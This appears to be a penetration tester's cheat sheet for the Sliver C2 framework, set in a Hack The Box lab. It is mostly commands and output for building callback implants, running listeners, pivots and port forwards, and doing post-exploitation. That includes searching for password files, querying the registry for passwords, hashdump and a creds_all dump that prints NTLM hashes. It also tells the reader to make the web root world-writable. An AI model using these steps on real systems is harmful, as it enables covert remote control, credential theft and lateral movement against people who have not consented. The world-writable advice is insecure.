# Sliver

## Sliver Basics

### Installation

```
apt-get update -y 
apt-get install build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
mkdir sliver 
cd sliver
curl https://sliver.sh/install|sudo bash
```

* Assuming `/usr/local/bin/` is in your path, your sliver server should be available in the shell as `sliver-server` and the client as `sliver`.

### Prepare a delivery method <a href="#prepare-a-delivery-method" id="prepare-a-delivery-method"></a>

On your C2 server, run `systemctl start apache2` to start a web server. You can now copy the implants you generate into the folder `/var/www/html` and Apache will serve them. To allow any system user to put a payload their, you can run `chmod -R 777 /var/www/html`.

### Generating the implant <a href="#generating-the-implant" id="generating-the-implant"></a>

Implant generation happens on the C2 server with the `generate` command. Connect to it and run `help generate` to read the extensive help page and learn about all the flags. Here is a selection of the most important flags for now:

* `--mtls 192.168.122.111`: Specifies that the implant should connect to the Sliver server using a mutually authenticated TLS connection. Other options would be `--wg` for WireGuard, `--http` for HTTP(S) connections or `--dns` for DNS-based C2.
* `--os windows`: specifies that we want to run the implant on Windows (which is the default, so we could omit this one). MacOS and Linux are also supported.
* `--arch amd64`" specifies that we want a 64-bit implant (also the default, could be omitted). Use `--arch 386` for a 32-bit one.
* `--format exe`: specifies that we want an executable file (again the default). Other options are `--format shared` for dynamic libraries, `--format service` for a Windows service binary (can be used with the `psexec` command) and `shellcode` (only windows).
* `--save /var/www/html/`: specifies the directory to save the binary to. I like to use the Apache web root.

```
sliver > generate --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html
```

### Fix Permissions&#x20;

The file `/var/www/html/MEDICAL_CHANGE.exe` will not be owned by the Apache system user and has very restrictive file system permissions. To make it accessible for Apache, run `sudo chown www-data:www-data /var/www/html/MEDICAL_CHANGE.exe`.

### Start Listener



Now start the mTLS listener on the C2 server using the `mtls` command. By default, it starts the listener on port 8888. You can view your listeners with the `jobs` command:

```
sliver > mtls

[*] Starting mTLS listener ...
sliver > 
[*] Successfully started job #1

sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888
```

### Transfer Binary to Target&#x20;

<figure><img src="../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

### Execute The Binary

* If all is successful you will see a new session opened

```
[*] Session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:36:48 CEST
```

### Using a session <a href="#using-a-session" id="using-a-session"></a>

You can use your session with the `use` command. Just type it, hit enter, and an interactive prompt will appear that allows to select a session. Hit enter again and your prompt changes to the implant name, which was `MEDICAL_CHANGE` in my case. The session is now active and ready to accept your commands. With `info`, you can get more information about the implant:

```
sliver > use

? Select a session or beacon: SESSION  971c5a23  MEDICAL_CHANGE  192.168.122.160:50051  DESKTOP-IPQVF9T  DESKTOP-IPQVF9T\tester  windows/amd64
[*] Active session MEDICAL_CHANGE (971c5a23-73e0-4418-b9c2-266484546e0d)

sliver (MEDICAL_CHANGE) > info

        Session ID: 971c5a23-73e0-4418-b9c2-266484546e0d
              Name: MEDICAL_CHANGE
          Hostname: DESKTOP-IPQVF9T
              UUID: d512a12c-6b6d-4f19-814e-1f60088e9563
          Username: DESKTOP-IPQVF9T\tester
               UID: S-1-5-21-2966923018-1740081829-2498838087-1001
               GID: S-1-5-21-2966923018-1740081829-2498838087-513
               PID: 7244
                OS: windows
           Version: 10 build 19044 x86_64
              Arch: amd64
         Active C2: mtls://192.168.122.111:8888
    Remote Address: 192.168.122.160:50051
         Proxy URL: 
Reconnect Interval: 1m0s
```

Sliver implants supports several commands. You can get a full list with `help`. Features include file system exploration, file up- and downloads, port forwarding, taking screenshots and much more.

### Kill Session

```
sessions 
sessions -k session_id
```

```
sliver > sessions

 ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
========== =========== ======================= ================= ========== ================== =========
 971c5a23   mtls        192.168.122.160:50051   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE] 

sliver > sessions -k 971c5a23


[!] Lost session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:52:53 CEST
```

### Kill Jobs&#x20;

* To kill your listener&#x20;

```
[server] sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    mtls   tcp        8888 

[server] sliver > jobs -k 1

[*] Killing job #1 ...
[*] Successfully killed job #1
[!] Job #1 stopped (tcp/mtls)

```

### Generating Beaconing implant <a href="#generating-the-implant-1" id="generating-the-implant-1"></a>

Generating a beacon implant is very similar to session implant generation. You use the `generate beacon` command. Learn all about the flags with `help generate beacon`. Aside from all the flags discussed above, relevant beacon flags are:

* `--seconds 5`: specify that the beacon should contact the C2 server every 5 seconds. You could alternatively use `--minutes`, `--hours` or `--days`.
* `--jitter 3`: specify that an additional random delay of up to 3 seconds should be added to the 5 seconds interval.

This is how I generated the beacon:

```
sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html --seconds 5 --jitter 3

[*] Generating new windows/amd64 beacon implant binary (5s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:00:18
[*] Implant saved to /var/www/html/STALE_PNEUMONIA.exe
```

### Sliver Survey

* Execute the following commands in order upon session opening

```
info               Get info about session
getgid             Get session process GID
getpid             Get session pid
getuid             Get session process UID
whoami             Get session user execution context
ps                 List remote processes
netstat            Print network connection information
pwd                Print working directory
ls                 List current directory
screenshot         Take a screenshot
getprivs          Get current privileges (Windows only)
```

* After this general survey, decide if you want/need (opsec) to migrate to a new process or not.

```
migrate           Migrate into a remote process
getprivs          Get current privileges (Windows only)
```

## Sliver In-Depth

### Generation of implants Quick Paste&#x20;

```
# linux
generate -a amd64 --format exe --mtls 10.10.14.4:8080 --name DANTENIX01 --os linux --save /home/ubuntu/Documents/htb/dante/10.10.110.100/implants
# windows
generate -a amd64 --format exe --mtls 172.16.1.100:8443 --name DANTE-WS01 --os windows --save /home/ubuntu/Documents/htb/dante/172.16.1.13/implants
```

### Create Listener Quick Paste

```
# mtls listener
mtls -L 10.10.14.2 -l 8080
# pivot listener 
pivots tcp -l 3006 --bind 172.16.1.100 -t 300
```

### Pivots Quick Paste

```
# linux
generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o linux -s /home/ubuntu/Documents/htb/dante/172.16.1.100.3006.pivot
# windows 
generate --tcp-pivot 172.16.1.100:3006 -a amd64 -o windows -s /home/ubuntu/Documents/htb/dante/172.16.1.100.3006.pivot
```

### Port Forward Quick Paste

```
portfwd add -b 60000 -r 127.0.0.1:4444

[*] Port forwarding 127.0.0.1:60000 -> 127.0.0.1:4444
```

* view current port forwards

```
portfwd

 ID   Session ID                             Bind Address      Remote Address  
==== ====================================== ================= =================
  1   15b59b8a-6954-4230-85e3-5ab927fcedc3   127.0.0.1:4444    127.0.0.1:4444  
  2   15b59b8a-6954-4230-85e3-5ab927fcedc3   127.0.0.1:1900    127.0.0.1:1900  
  3   15b59b8a-6954-4230-85e3-5ab927fcedc3   127.0.0.1:50142   127.0.0.1:50142 
```

* delete a current port forward

```
portfwd rm -i 2
```

### Sliver Windows Post Exploitation

* good finds&#x20;

```
execute -t 120 -o cmd.exe /c "dir c:\*pass* /s"
execute -t 120 -o cmd.exe /c "dir c:\*password* /s"
execute -t 120 -o cmd.exe /c "dir c:\*login* /s"
execute -t 120 -o cmd.exe /c "dir c:\*.key /s"
execute -t 120 -o cmd.exe /c "dir c:\*.ica /s"
execute -t 120 -o cmd.exe /c "dir c:\*.pwd* /s"
execute -t 120 -o cmd.exe /c "dir c:\*.config* /s"
execute -t 120 -o cmd.exe /c "dir c:\*access* /s"
```

* passwords in the registry&#x20;

```
execute -o cmd.exe /c 'reg query HKCU /f password /t REG_SZ /s'
```

### Execute-Assembly

```
execute-assembly -t 80 /home/ubuntu/Downloads/Autoruns64.exe -accepteula
```

### sa-netlocalgroup

* Coff-loader method of attaining local groups on a windows machines
* Works on Domain Controllers as well

```
sa-netlocalgroup
[*] Successfully executed sa-netlocalgroup (coff-loader)
[*] Got output:
Name:      Administrators
Comment:   Administrators have complete and unrestricted access to the computer/domain
--------------------------------
Name:      Users
Comment:   Users are prevented from making accidental or intentional system-wide changes and can run most applications
--------------------------------
Name:      Guests
Comment:   Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
--------------------------------
--snip--
```

### Hashdump

* Dump hashes from sliver session

```
hashdump
[*] Successfully executed hashdump
[*] Got output:
Administrator:500:Administrator:500:aad3b435b51404eeaad3b435b51404ee:3317be94bdf8da53235f825815bda05a:::::
Guest:501:Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::::
```

### c2tc-domaininfo

* Enumerate domain information from a DC

```
d2tc-domaininfo
[*] Successfully executed c2tc-domaininfo (coff-loader)
[*] Got output:
--------------------------------------------------------------------
[+] DomainName:
    DANTE.local
[+] DomainGuid:
    {BF59501C-28DB-4087-A02D-E6CFA4C2575D}
[+] DnsForestName:
    DANTE.local
[+] DcSiteName:
    Default-First-Site-Name
[+] ClientSiteName:
    Default-First-Site-Name
[+] DomainControllerName (PDC):
    \\DANTE-DC01.DANTE.local
[+] DomainControllerAddress (PDC):
    \\172.16.1.20
[+] Default Domain Password Policy:
    Password history length: 24
    Maximum password age (d): 180
    Minimum password age (d): 0
    Minimum password length: 7
[+] Account Lockout Policy:
    Account lockout threshold: 0
    Account lockout duration (m): 30
    Account lockout observation window (m): 30
[+] NextDc DnsHostName:
    dante-dc01.dante.local
```

### creds\_all

* dump all creds mimikatz style from a Windows machine, works on a domain controller

```
creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain  NTLM                              SHA1
--------     ------  ----                              ----
DANTE-DC01$  DANTE   b12ff47444ad1cc6996fd2d681a3f136  dec3493ce38fca341cc189fe2513dd797e19ca85
DANTE-DC01$  DANTE   8e387753e4e7e9901053030a0eafa53f  125870c6bbea628954c8e8767761cc1185622fe7
MediaAdmin$  DANTE   7c53bb427b222695060d8fd771743fb9  10757578eb3902bd612c306bee80bf44da1efaab
katwamba     DANTE   14a71f9de5448d83e8c63d46355837c3  61d3cacf6ad5f4571747b302a9658f7e85c5d516
xadmin       DANTE   649f65054a6672a9898cb4eb61f9684a  b57e3049b5960ed60f1baa679ab0cfd4f68b0b06
--snip--
```
